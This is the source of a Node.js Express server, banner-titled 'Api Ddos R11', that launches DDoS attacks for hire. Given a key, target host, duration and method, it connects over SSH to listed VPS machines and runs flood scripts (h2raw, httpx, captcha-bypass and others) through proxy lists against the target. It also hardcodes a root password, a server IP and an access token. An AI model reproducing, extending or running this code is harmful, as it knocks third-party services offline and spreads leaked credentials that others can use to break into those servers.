const express = require('express');
const { Client } = require('ssh2');
const app = express();
const port = 3000;

const scripts = {
    captcha: 'captcha.js',
    pidoras: 'pidoras.js',
    xyn: 'xyn.js',
    cibi: 'cibi.js',
    h2raw: 'h2raw.js',
    proxy: 'scrape.js',
    httpx: 'httpx.js',
    glory: 'glory.js',
    hold: 'hold.js',
};

// Konfigurasi khusus untuk thread dan rate setiap metode
const methodConfig = {
    captcha: { thread: 32, rate: 2 },
    pidoras: { thread: 32, rate: 4 },
    xyn: { thread: 32, rate: 4 },
    cibi: { thread: 32, rate: 2 },
    h2raw: { thread: 32, rate: 2 },
    proxy: { thread: 1, rate: 1 },
    httpx: { thread: 32, rate: 2 },
    glory: { thread: 32, rate: 2 },
    hold: { thread: 11, rate: 1 },
};

const vpsList = [
    {
        host: "68.183.180.197",
        username: "root",
        password: "anjengs12",
    },
    {
        host: "rloo1197-serios-1r0fmbdnip1.ssh.ws-us117.gitpod.io",
        token: "rloo1197-serios-1r0fmbdnip1#t85qYvJ6eaBn348pgoikx1b8AxyXU5Rm",
    },
];

app.get('/api', (req, res) => {
    const { key, host, time, method, username } = req.query;

    if (key !== 'rloo11') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (!scripts[method]) {
        return res.status(400).json({ error: 'Invalid method' });
    }

    const { thread, rate } = methodConfig[method] || { thread: 30, rate: 2 };
    const scriptFile = scripts[method];
    const command = `cd ./var/trash/ && node ${scriptFile} ${host} ${time} ${thread} ${rate} proxy.txt`;

    const attackDetails = {
        username: username || 'Anonymous',
        target: host,
        method: method,
        duration: time,
        thread: thread,
        rate: rate,
    };

    console.log('Attack initiated by:', attackDetails);

    const connectToVPS = (vps, callback) => {
        const conn = new Client();

        conn.on('ready', () => {
            console.log(`Connected to VPS: ${vps.host}`);
            conn.exec(command, (err, stream) => {
                if (err) {
                    conn.end();
                    return callback(`Failed to execute command on ${vps.host}`);
                }

                stream
                    .on('close', () => {
                        console.log(`Command executed on ${vps.host}`);
                        conn.end();
                        callback(null, `Success on ${vps.host}`);
                    })
                    .stderr.on('data', (data) => {
                        console.error(`STDERR (${vps.host}): ${data}`);
                    });
            });
        });

        conn.on('error', (err) => {
            console.error(`SSH connection error to ${vps.host}: ${err.message}`);
            callback(`SSH connection error on ${vps.host}: ${err.message}`);
        });

        if (vps.token) {
            const [username, hostWithPort] = vps.token.split('@');
            conn.connect({
                host: hostWithPort.split(':')[0],
                username,
            });
        } else {
            conn.connect({
                host: vps.host,
                username: vps.username,
                password: vps.password,
            });
        }
    };

    let completed = 0;
    const results = [];
    vpsList.forEach((vps) => {
        connectToVPS(vps, (err, result) => {
            completed++;
            results.push(err || result);

            if (completed === vpsList.length) {
                res.json({
                    message: 'Command executed on all VPS',
                    results,
                });
            }
        });
    });
});

console.clear();
app.listen(port, () => {
    console.log(`
██████╗░██╗░░░░░░░███╗░░░░███╗░░
██╔══██╗██║░░░░░░████║░░░████║░░
██████╔╝██║░░░░░██╔██║░░██╔██║░░
██╔══██╗██║░░░░░╚═╝██║░░╚═╝██║░░
██║░░██║███████╗███████╗███████╗
╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

░█████╗░██████╗░██╗
██╔══██╗██╔══██╗██║
███████║██████╔╝██║
██╔══██║██╔═══╝░██║
██║░░██║██║░░░░░██║
╚═╝░░╚═╝╚═╝░░░░░╚═╝
Welcome To Api Ddos R11
Running On Port ${port}
`);
});